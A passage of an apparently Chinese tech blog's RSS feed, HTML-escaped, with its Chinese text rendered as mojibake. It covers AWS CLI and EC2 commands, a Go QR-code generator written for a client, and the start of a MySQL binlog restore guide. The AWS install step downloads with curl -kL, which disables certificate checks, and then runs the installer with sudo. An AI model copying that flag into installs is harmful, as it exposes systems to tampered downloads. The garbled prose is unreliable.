&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c#&#34; data-lang=&#34;c#&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;#å®‰è£…&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;awsçš„å·¥å…·&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;cd&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tmp&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;curl&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;kL&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;o&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;awscliv2.zip&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;unzip&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;awscliv2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;zip&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;sudo&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;./&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;aws&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;install&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;aws&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;version&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;#é…ç½®&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;aws&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;aws&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;configure&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;#æŸ¥çœ‹é…ç½®&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;aws&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;configure&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;list&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;----------------------------&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;#ç”³è¯·ä¸€ä¸ªæ–°&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;IPå¹¶ä¸”æ‰“tag&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;aws&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ec2&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;allocate&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;address&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;region&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Region&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tee&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tmp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;eip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;eip_id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;jq&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;r&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;.AllocationId&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tmp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;eip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;aws&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ec2&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;create&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tags&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;resources&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;eip_id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tags&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;eip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;01&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;eip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;jq&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;r&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;.PublicIp&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tmp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;eip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;#ç»™&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ec2èµ‹ip&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;ï¼Œå‰ææ˜¯çŸ¥é“&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ec2_id&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;aws&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ec2&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;associate&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;address&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;instance&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;id&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ec2_id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;allocation&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;id&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;eip_id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;----------------------------&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;#å¯åŠ¨æ–°&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ec2çš„æ–¹æ³•&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;ï¼š&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;#å¯åŠ¨&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ec2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;aws&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ec2&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;run&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;instances&lt;/span&gt; \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;region&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Region&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;count&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;instance&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;type&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;t2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;micro&lt;/span&gt; \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;subnet&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;id&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;lan_a_public_id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;security&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;group&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ids&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;gid&lt;/span&gt; \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;name&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;MySshKey&lt;/span&gt; \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;image&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;id&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ami&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;04f&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;f9e9b51c1f62ca&lt;/span&gt;  \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tee&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tmp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ec2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ec2_id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;jq&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;r&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;.Instances[0].InstanceId&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tmp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ec2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id=&#34;å‚è€ƒ&#34;&gt;å‚è€ƒï¼š&lt;/h5&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/elvi/p/16542406.html&#34;&gt;https://www.cnblogs.com/elvi/p/16542406.html&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Freelancerä¹‹QRCode</title>
      <link>https://rendoumi.com/posts/20221123-freelancer_qrcode/</link>
      <pubDate>Wed, 23 Nov 2022 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20221123-freelancer_qrcode/</guid>
      <description>&lt;p&gt;å®¢æˆ·å‘äº†ä¸€ä¸ªéœ€æ±‚å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;TODO: åœ¨sortFilesä¸­ï¼Œè·å–æœ€æ–°çš„åŸŸåï¼Œç”ŸæˆäºŒç»´ç ï¼Œè¦†ç›–QRCodePathå›¾ç‰‡
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;TODO:å°†QRCodePathå›¾ç‰‡ä¸Šä¼ åˆ°é˜¿é‡Œäº‘0Sæ ¹ç›®å½•ï¼Œé‡å¤åˆ™è¦†ç›–
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;åˆå…·ä½“è¯¢é—®äº†ä¸€ä¸‹ç»†èŠ‚ï¼Œæ˜¯ä¸€ä¸ª csharp çš„ç¨‹åº&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;var sortFiles = Directory.GetFiles(zipPath, &amp;#34;*.zip&amp;#34;).Select(fn =&amp;gt; new FileInfo(fn)).OrderBy(f =&amp;gt; f.LastAccessTime);

// TODO: åœ¨sortFilesä¸­ï¼Œè·å–æœ€æ–°çš„åŸŸåï¼ˆæ–‡ä»¶åå»æ‰.zipå°±æ˜¯åŸŸåï¼‰ï¼Œç»“åˆlogoUrlç”ŸæˆäºŒç»´ç ï¼Œè¦†ç›–QRCodePathå›¾ç‰‡


// TODO: å°†QRCodePathå›¾ç‰‡ä¸Šä¼ åˆ°é˜¿é‡Œäº‘OOSæ ¹ç›®å½•ï¼Œé‡å¤åˆ™è¦†ç›–ï¼Œ
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;çœ‹äº†ä¸€ä¸‹ï¼Œè§‰å¾—æ€è·¯å¦‚ä¸‹ï¼Œè¿™æ˜¯ä¸ªç®¡é“æµï¼Œæ— è®ºå¾’æ‰‹å†™ä»£ç ç”ŸæˆQRCODE(è¿˜æœ‰ä¸ªlogoå›¾éœ€è¦æ”¾åˆ°äºŒç»´ç ä¸­å¤®)ï¼Œè¿˜æ˜¯é›†æˆOSSçš„SDKéƒ½éº»çƒ¦&lt;/p&gt;
&lt;p&gt;æœ€å¿«é€Ÿæ–¹æ³•æ˜¯ç›´æ¥è°ƒç”¨å¤–éƒ¨æˆç¨‹åºåšè¿™ä¸¤æ­¥ï¼Œç¬¬ä¸€æ­¥ç”¨Goå†™ä¸ªç¨‹åºç”ŸæˆäºŒç»´ç ï¼Œç¬¬äºŒæ­¥ç”¨é˜¿é‡Œçš„ossutil64å·¥å…·ä¸Šä¼ &lt;/p&gt;
&lt;h4 id=&#34;ä¸€goç¨‹åºgenå‡ºqrcode&#34;&gt;ä¸€ã€Goç¨‹åºGenå‡ºQRCode&lt;/h4&gt;
&lt;p&gt;go æœ‰å¾ˆå¤šåº“ï¼Œæˆ‘ä»¬ç›´æ¥æ‹¿æ¥ç”¨å¥½äº†ï¼Œä½†æ˜¯åŸºæœ¬ä¸Šéƒ½æ˜¯è€ä»£ç ï¼Œæ‰€ä»¥éœ€è¦ä¸‹è½½ go1.13.15 æ¥ç”¨&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# ä¸‹è½½go 1.13.15ï¼Œè§£å‹åˆ°E:\goï¼Œå¹¶å»ºç«‹ä¸€ä¸ªE:\go\go-workç›®å½•ï¼Œä¸‹è½½çš„æ¨¡å—ä¼šæ”¾åˆ°è¿™é‡Œ
https://dl.google.com/go/go1.13.15.windows-amd64.zip

# è®¾ç½®ä¸‰ä¸ªå˜é‡
GOROOT=E:\go
GOPATH=E:\go\go-work
PATHä¸­å¢åŠ å¥½E:\go\binçš„ç›®å½•

# è®¾ç½®ä¸€ä¸‹ä»£ç†ï¼Œæœ‰æ—¶å€™æ¨¡å—æ‹‰ä¸ä¸‹æ¥
go env -w GOPROXY=https://goproxy.cn,direct
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ç„¶åå°±å‡†å¤‡gen qrcodeçš„ç¨‹åºï¼Œmain.go&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;package main

import (
	&amp;#34;flag&amp;#34;
	&amp;#34;image&amp;#34;
	&amp;#34;image/draw&amp;#34;
	&amp;#34;image/jpeg&amp;#34;
	_ &amp;#34;image/png&amp;#34;
	&amp;#34;os&amp;#34;
	&amp;#34;path/filepath&amp;#34;

	&amp;#34;github.com/LyricTian/logger&amp;#34;
	&amp;#34;github.com/nfnt/resize&amp;#34;
	&amp;#34;github.com/skip2/go-qrcode&amp;#34;
)

var (
	text    string
	logo    string
	percent int
	size    int
	out     string
)

func init() {
	flag.StringVar(&amp;amp;text, &amp;#34;t&amp;#34;, &amp;#34;&amp;#34;, &amp;#34;äºŒç»´ç å†…å®¹&amp;#34;)
	flag.StringVar(&amp;amp;logo, &amp;#34;l&amp;#34;, &amp;#34;&amp;#34;, &amp;#34;äºŒç»´ç Logo(png)&amp;#34;)
	flag.IntVar(&amp;amp;percent, &amp;#34;p&amp;#34;, 15, &amp;#34;äºŒç»´ç Logoçš„æ˜¾ç¤ºæ¯”ä¾‹(é»˜è®¤15%)&amp;#34;)
	flag.IntVar(&amp;amp;size, &amp;#34;s&amp;#34;, 256, &amp;#34;äºŒç»´ç çš„å¤§å°(é»˜è®¤256)&amp;#34;)
	flag.StringVar(&amp;amp;out, &amp;#34;o&amp;#34;, &amp;#34;&amp;#34;, &amp;#34;è¾“å‡ºæ–‡ä»¶&amp;#34;)
}

func main() {
	flag.Parse()

	if text == &amp;#34;&amp;#34; {
		logger.Fatalf(&amp;#34;è¯·æŒ‡å®šäºŒç»´ç çš„ç”Ÿæˆå†…å®¹&amp;#34;)
	}

	if out == &amp;#34;&amp;#34; {
		logger.Fatalf(&amp;#34;è¯·æŒ‡å®šè¾“å‡ºæ–‡ä»¶&amp;#34;)
	}

	if exists, err := checkFile(out); err != nil {
		logger.Fatalf(&amp;#34;æ£€æŸ¥è¾“å‡ºæ–‡ä»¶å‘ç”Ÿé”™è¯¯ï¼š%s&amp;#34;, err.Error())
	} else if exists {
		logger.Fatalf(&amp;#34;è¾“å‡ºæ–‡ä»¶å·²ç»å­˜åœ¨ï¼Œè¯·é‡æ–°æŒ‡å®š&amp;#34;)
	}

	code, err := qrcode.New(text, qrcode.Highest)
	if err != nil {
		logger.Fatalf(&amp;#34;åˆ›å»ºäºŒç»´ç å‘ç”Ÿé”™è¯¯ï¼š%s&amp;#34;, err.Error())
	}

	srcImage := code.Image(size)
	if logo != &amp;#34;&amp;#34; {
		logoSize := float64(size) * float64(percent) / 100

		srcImage, err = addLogo(srcImage, logo, int(logoSize))
		if err != nil {
			logger.Fatalf(&amp;#34;å¢åŠ Logoå‘ç”Ÿé”™è¯¯ï¼š%s&amp;#34;, err.Error())
		}
	}

	outAbs, err := filepath.Abs(out)
	if err != nil {
		logger.Fatalf(&amp;#34;è·å–è¾“å‡ºæ–‡ä»¶ç»å¯¹è·¯å¾„å‘ç”Ÿé”™è¯¯ï¼š%s&amp;#34;, err.Error())
	}

	os.MkdirAll(filepath.Dir(outAbs), 0777)
	outFile, err := os.Create(outAbs)
	if err != nil {
		logger.Fatalf(&amp;#34;åˆ›å»ºè¾“å‡ºæ–‡ä»¶å‘ç”Ÿé”™è¯¯ï¼š%s&amp;#34;, err.Error())
	}
	defer outFile.Close()

	jpeg.Encode(outFile, srcImage, &amp;amp;jpeg.Options{Quality: 100})

	logger.Infof(&amp;#34;äºŒç»´ç ç”ŸæˆæˆåŠŸï¼Œæ–‡ä»¶è·¯å¾„ï¼š%s&amp;#34;, outAbs)
}

func checkFile(name string) (bool, error) {
	_, err := os.Stat(name)
	if err != nil {
		if os.IsNotExist(err) {
			return false, nil
		}
		return false, err
	}
	return true, nil
}

func resizeLogo(logo string, size uint) (image.Image, error) {
	file, err := os.Open(logo)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	img, _, err := image.Decode(file)
	if err != nil {
		return nil, err
	}

	img = resize.Resize(size, size, img, resize.Lanczos3)
	return img, nil
}

func addLogo(srcImage image.Image, logo string, size int) (image.Image, error) {
	logoImage, err := resizeLogo(logo, uint(size))
	if err != nil {
		return nil, err
	}

	offset := image.Pt((srcImage.Bounds().Dx()-logoImage.Bounds().Dx())/2, (srcImage.Bounds().Dy()-logoImage.Bounds().Dy())/2)
	b := srcImage.Bounds()
	m := image.NewNRGBA(b)
	draw.Draw(m, b, srcImage, image.ZP, draw.Src)
	draw.Draw(m, logoImage.Bounds().Add(offset), logoImage, image.ZP, draw.Over)

	return m, nil
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ä¸Šé¢å¾ˆç®€å•ï¼Œç”¨åˆ°äº†åˆ«äººçš„ä¸‰ä¸ªæ¨¡å—ï¼Œéœ€è¦å®‰è£…ä¸€ä¸‹&lt;/p&gt;</description>
    </item>
    <item>
      <title>MySQLæ•°æ®åº“çš„å¤‡ä»½å’Œæ¢å¤ä¹‹äºŒ</title>
      <link>https://rendoumi.com/posts/20221122-mysqldump_binlog/</link>
      <pubDate>Tue, 22 Nov 2022 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20221122-mysqldump_binlog/</guid>
      <description>&lt;p&gt;æˆ‘ä»¬æ¥è¯´æ¢å¤çš„ç¬¬äºŒç§æƒ…å†µï¼Œå°±æ˜¯éœ€è¦ä»binlogä¸­æŒ‡å®šä½ç½®æ¢å¤&lt;/p&gt;
&lt;p&gt;binlogå¦‚ä½•è®¾ç½®ä¸è¯´äº†ï¼Œæˆ‘ä»¬å‡è®¾ä¸Šæ¬¡ç”¨mysqldumpåšè¿‡ä¸€æ¬¡å…¨é‡å¤‡ä»½ã€‚&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;mysqldump -uroot -p  -h 192.168.1.35 -P3306 --opt --triggers -R --hex-blob  --single-transaction --flush-logs --master-data=2 -B åº“å  &amp;gt; åº“å.sql
